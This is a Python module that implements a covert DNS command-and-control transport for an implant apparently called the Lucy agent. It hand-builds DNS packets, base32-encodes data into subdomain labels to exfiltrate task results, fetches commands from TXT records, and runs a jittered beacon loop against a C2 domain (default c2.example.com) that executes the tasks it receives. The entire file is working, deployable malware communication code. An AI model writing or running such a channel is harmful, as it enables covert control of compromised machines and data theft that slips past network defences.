"""
DNS beacon transport for Lucy agent.

Implements a covert C2 channel over DNS queries.  Data is base32-encoded
and split into DNS-safe subdomain labels, then sent as A/TXT/AAAA queries
to a resolver.  Task results are exfiltrated via query names; tasks are
received via TXT record responses.

Uses only the Python standard library (socket, struct) — the DNS protocol
is implemented manually to avoid external dependencies.

os_compat = ["Windows", "Linux", "Darwin"]
dependencies = []
"""
import base64
import logging
import random
import socket
import struct
import threading
import time

logger = logging.getLogger("lucy_agent.dns")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_DNS_PORT = 53
_MAX_LABEL_LEN = 63
_MAX_NAME_LEN = 253
_BASE32_ALPHABET = "abcdefghijklmnopqrstuvwxyz234567"
_RECV_BUF = 4096

# DNS record types
QTYPE_A = 1
QTYPE_NS = 2
QTYPE_CNAME = 5
QTYPE_TXT = 16
QTYPE_AAAA = 28

_QTYPE_MAP = {
    "A": QTYPE_A,
    "TXT": QTYPE_TXT,
    "AAAA": QTYPE_AAAA,
}

# ---------------------------------------------------------------------------
# DNS packet construction / parsing (stdlib only)
# ---------------------------------------------------------------------------


def _build_query_header(query_id: int) -> bytes:
    """Build a 12-byte DNS header for a standard recursive query."""
    # QR=0 (query), Opcode=0, RD=1 (recursion desired)
    flags = 0x0100
    return struct.pack("!HHHHHH", query_id, flags, 1, 0, 0, 0)


def _encode_name(name: str) -> bytes:
    """Encode a domain name into DNS wire format (length-prefixed labels)."""
    out = b""
    for label in name.split("."):
        b = label.encode("ascii")
        if len(b) > _MAX_LABEL_LEN:
            raise ValueError(f"DNS label too long ({len(b)} > {_MAX_LABEL_LEN}): {label}")
        out += bytes([len(b)]) + b
    out += b"\x00"  # root terminator
    return out


def _build_query_packet(query_id: int, name: str, qtype: int) -> bytes:
    """Build a complete DNS query packet."""
    header = _build_query_header(query_id)
    qname = _encode_name(name)
    # QCLASS = IN (1)
    question = qname + struct.pack("!HH", qtype, 1)
    return header + question


def _parse_response_packet(packet: bytes) -> dict:
    """
    Parse a DNS response packet.

    Returns dict with keys: id, answers (list of (name, type, ttl, data)).
    For TXT records, data is a list of strings.  For A records, data is an
    IPv4 string.  For AAAA, an IPv6 string.
    """
    if len(packet) < 12:
        raise ValueError("DNS response too short")

    (q_id, flags, qdcount, ancount, nscount, arcount) = struct.unpack("!HHHHHH", packet[:12])
    offset = 12

    # Skip question section
    for _ in range(qdcount):
        offset = _skip_name(packet, offset)
        offset += 4  # qtype + qclass

    answers = []
    for _ in range(ancount):
        name, offset = _read_name(packet, offset)
        if offset + 10 > len(packet):
            break
        (rrtype, rrclass, ttl, rdlength) = struct.unpack("!HHIH", packet[offset:offset + 10])
        offset += 10
        rdata = packet[offset:offset + rdlength]
        offset += rdlength

        if rrtype == QTYPE_TXT:
            txts = _parse_txt_rdata(rdata)
            answers.append({"name": name, "type": "TXT", "ttl": ttl, "data": txts})
        elif rrtype == QTYPE_A and rdlength == 4:
            ip = ".".join(str(b) for b in rdata)
            answers.append({"name": name, "type": "A", "ttl": ttl, "data": ip})
        elif rrtype == QTYPE_AAAA and rdlength == 16:
            # Simple IPv6 formatting
            parts = []
            for i in range(0, 16, 2):
                parts.append(f"{rdata[i]:02x}{rdata[i+1]:02x}")
            ip = ":".join(parts)
            answers.append({"name": name, "type": "AAAA", "ttl": ttl, "data": ip})
        else:
            answers.append({"name": name, "type": rrtype, "ttl": ttl, "data": rdata.hex()})

    return {"id": q_id, "answers": answers}


def _skip_name(packet: bytes, offset: int) -> int:
    """Skip a (possibly compressed) domain name and return new offset."""
    while offset < len(packet):
        length = packet[offset]
        if length == 0:
            return offset + 1
        if (length & 0xC0) == 0xC0:
            return offset + 2  # compressed pointer
        offset += 1 + length
    return offset


def _read_name(packet: bytes, offset: int) -> tuple[str, int]:
    """Read a (possibly compressed) domain name, returning (name, new_offset)."""
    labels = []
    original_offset = offset
    jumped = False
    end_offset = offset

    while offset < len(packet):
        length = packet[offset]
        if length == 0:
            offset += 1
            if not jumped:
                end_offset = offset
            break
        if (length & 0xC0) == 0xC0:
            pointer = ((length & 0x3F) << 8) | packet[offset + 1]
            if not jumped:
                end_offset = offset + 2
            offset = pointer
            jumped = True
            continue
        offset += 1
        labels.append(packet[offset:offset + length].decode("ascii", errors="replace"))
        offset += length

    if not jumped:
        end_offset = offset
    return ".".join(labels), end_offset


def _parse_txt_rdata(rdata: bytes) -> list[str]:
    """Parse TXT record rdata — one or more length-prefixed strings."""
    txts = []
    i = 0
    while i < len(rdata):
        slen = rdata[i]
        i += 1
        txts.append(rdata[i:i + slen].decode("utf-8", errors="replace"))
        i += slen
    return txts


# ---------------------------------------------------------------------------
# Base32 encoding / chunking
# ---------------------------------------------------------------------------


def encode_query(data: bytes) -> list[str]:
    """
    Base32-encode *data* and split into DNS-safe labels.

    Each label is at most 63 bytes.  Returns a list of label strings
    (without the base domain appended).
    """
    encoded = base64.b32encode(data).decode("ascii").rstrip("=").lower()
    labels = []
    for i in range(0, len(encoded), _MAX_LABEL_LEN):
        labels.append(encoded[i:i + _MAX_LABEL_LEN])
    return labels if labels else ["x"]


def decode_txt_response(txt_records: list[str]) -> bytes:
    """
    Decode TXT record strings back into binary data.

    Each TXT string is expected to be a base32 fragment.  Fragments are
    concatenated (in order) and base32-decoded.  Padding is re-added
    automatically.
    """
    combined = ""
    for txt in txt_records:
        # Strip any non-base32 characters (prefixes, sequence markers)
        clean = "".join(c for c in txt if c in _BASE32_ALPHABET)
        combined += clean
    # Re-pad to a multiple of 8
    pad = (8 - len(combined) % 8) % 8
    combined += "=" * pad
    try:
        return base64.b32decode(combined.upper())
    except Exception as exc:
        logger.warning("DNS TXT decode failed: %s", exc)
        return b""


# ---------------------------------------------------------------------------
# DNS Beacon
# ---------------------------------------------------------------------------


class DNSBeacon:
    """DNS-based C2 beacon configuration."""

    def __init__(
        self,
        domain: str = "c2.example.com",
        dns_server: str = "",
        record_type: str = "A",
        query_interval: float = 30.0,
        jitter: float = 5.0,
    ) -> None:
        self.domain = domain.rstrip(".")
        self.dns_server = dns_server
        self.record_type = record_type.upper()
        self.query_interval = query_interval
        self.jitter = jitter

    def _resolve_dns_server(self) -> str:
        """Return the configured DNS server or a system default."""
        if self.dns_server:
            return self.dns_server
        # Try to read system resolv.conf (Linux/macOS)
        try:
            with open("/etc/resolv.conf", "r") as fh:
                for line in fh:
                    line = line.strip()
                    if line.startswith("nameserver"):
                        return line.split()[1]
        except (FileNotFoundError, PermissionError, OSError):
            pass
        return "8.8.8.8"

    def _query(self, name: str) -> dict | None:
        """Send a single DNS query and return the parsed response."""
        qtype = _QTYPE_MAP.get(self.record_type, QTYPE_A)
        query_id = random.randint(0, 0xFFFF)
        packet = _build_query_packet(query_id, name, qtype)
        server = self._resolve_dns_server()

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(10)
        try:
            sock.sendto(packet, (server, _DNS_PORT))
            data, _ = sock.recvfrom(_RECV_BUF)
            return _parse_response_packet(data)
        except socket.timeout:
            logger.debug("DNS query timed out for %s", name)
            return None
        except Exception as exc:
            logger.warning("DNS query error for %s: %s", name, exc)
            return None
        finally:
            sock.close()


# ---------------------------------------------------------------------------
# Send / receive helpers
# ---------------------------------------------------------------------------


def send_data(domain: str, data: bytes, dns_server: str = "") -> bool:
    """
    Encode *data* as DNS queries (base32 chunks as subdomains) and send
    via UDP to *dns_server*.

    Data is split into 63-byte labels with a max total name length of 253
    characters.  A sequence number is prepended to each chunk so the server
    can reassemble.  Returns True if all chunks were sent without error.
    """
    labels = encode_query(data)
    server = dns_server or "8.8.8.8"
    success = True

    for idx, label in enumerate(labels):
        # Build subdomain: seq.label.base.domain
        seq = f"{idx:02x}"
        subdomain = f"{seq}.{label}.{domain}"
        if len(subdomain) > _MAX_NAME_LEN:
            logger.warning("DNS name too long (%d): %s", len(subdomain), subdomain)
            success = False
            continue

        qtype = QTYPE_A
        query_id = random.randint(0, 0xFFFF)
        packet = _build_query_packet(query_id, subdomain, qtype)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(10)
        try:
            sock.sendto(packet, (server, _DNS_PORT))
            # Wait for response (fire-and-forget is also acceptable)
            sock.recvfrom(_RECV_BUF)
        except socket.timeout:
            # Timeout is acceptable for fire-and-forget exfil
            pass
        except Exception as exc:
            logger.warning("DNS send error (chunk %d): %s", idx, exc)
            success = False
        finally:
            sock.close()

        # Small delay between queries to avoid flooding
        time.sleep(0.05)

    return success


def receive_data(domain: str, dns_server: str = "") -> bytes:
    """
    Poll for TXT records containing C2 commands.

    Queries ``task.<domain>`` for TXT records and decodes any returned
    data.  Returns raw bytes (possibly empty).
    """
    query_name = f"task.{domain}"
    qtype = QTYPE_TXT
    query_id = random.randint(0, 0xFFFF)
    packet = _build_query_packet(query_id, query_name, qtype)
    server = dns_server or "8.8.8.8"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(10)
    try:
        sock.sendto(packet, (server, _DNS_PORT))
        data, _ = sock.recvfrom(_RECV_BUF)
        resp = _parse_response_packet(data)
        all_txts: list[str] = []
        for ans in resp.get("answers", []):
            if ans.get("type") == "TXT":
                all_txts.extend(ans.get("data", []))
        if all_txts:
            return decode_txt_response(all_txts)
    except socket.timeout:
        logger.debug("DNS receive timed out for %s", query_name)
    except Exception as exc:
        logger.warning("DNS receive error: %s", exc)
    finally:
        sock.close()
    return b""


# ---------------------------------------------------------------------------
# Beacon loop
# ---------------------------------------------------------------------------


class DNSBeaconLoop:
    """
    DNS beacon loop — polls for tasks via DNS TXT records and sends
    results back via DNS queries.

    Usage:
        loop = DNSBeaconLoop(domain="c2.example.com")
        loop.run(agent_id)
    """

    def __init__(
        self,
        domain: str = "c2.example.com",
        dns_server: str = "",
        query_interval: float = 30.0,
        jitter: float = 5.0,
    ) -> None:
        self.beacon = DNSBeacon(
            domain=domain,
            dns_server=dns_server,
            record_type="TXT",
            query_interval=query_interval,
            jitter=jitter,
        )
        self._stop_event = threading.Event()

    def stop(self) -> None:
        self._stop_event.set()

    def run(self, agent_id: str) -> None:
        """Main beacon loop.  Blocks until stop() is called."""
        logger.info("Starting DNS beacon loop for agent %s", agent_id)
        domain = self.beacon.domain
        dns_server = self.beacon.dns_server

        while not self._stop_event.is_set():
            try:
                # Poll for tasks
                raw = receive_data(domain, dns_server)
                if raw:
                    import json
                    try:
                        tasks = json.loads(raw.decode("utf-8"))
                        if isinstance(tasks, dict):
                            tasks = [tasks]
                        for task in tasks:
                            result = self._execute_task(task)
                            # Send result back via DNS
                            result_bytes = json.dumps(result).encode("utf-8")
                            send_data(f"result.{domain}", result_bytes, dns_server)
                    except (json.JSONDecodeError, UnicodeDecodeError) as exc:
                        logger.warning("DNS task decode error: %s", exc)
            except Exception as exc:
                logger.warning("DNS beacon loop error: %s", exc)

            # Sleep with jitter
            interval = self.beacon.query_interval
            if self.beacon.jitter > 0:
                interval += random.uniform(-self.beacon.jitter, self.beacon.jitter)
            interval = max(1.0, interval)
            self._stop_event.wait(timeout=interval)

    def _execute_task(self, task: dict) -> dict:
        """
        Execute a task.  Attempts to delegate to the agent's execute_task
        function if available; otherwise returns a stub error.
        """
        try:
            # Late import to avoid circular dependency when run standalone
            import agent as _agent_mod
            execute = getattr(_agent_mod, "execute_task", None)
            if callable(execute):
                return execute(task)
        except Exception:
            pass
        return {
            "task_id": task.get("task_id", ""),
            "status": "failed",
            "error": "No task executor available",
            "data": None,
        }
